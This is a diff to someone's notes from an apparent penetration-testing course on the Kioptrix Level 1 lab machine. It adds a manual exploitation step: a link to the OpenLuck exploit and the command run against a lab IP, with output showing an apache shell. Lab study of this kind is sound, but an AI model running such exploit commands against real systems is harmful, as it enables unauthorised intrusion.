@@ -317,7 +317,7 @@ output:
    bind shall
    ---------------
    we open a port in the target computer and we connect to it. and it is listing to us to connect 
- 02:40:00 https://www.youtube.com/watch?v=sH4JCwjybGs
+ 02:40:00 
  
  
   Geting Root w/ metasploit
@@ -340,7 +340,19 @@ output:
  12 when stop write whoami and the answer is root
     write hostname the answer is kioptrix.level1
 ==========================================================
- 02:40:00  
+ 
+ 
+ 02:45:00 manual explotation
+  OpenLuck
+install insrtuctios: https://github.com/heltonWernik/OpenLuck
+
+./OpenFuck 0x6b  10.0.2.4 -c 40
+outout :
+   shell screen:        'bash-2.05$'
+   hostname: kioptrix.level1
+   whoami:  apache    
+
+  02:59:00 https://www.youtube.com/watch?v=sH4JCwjybGs
 
  Demo Report
  --------------------
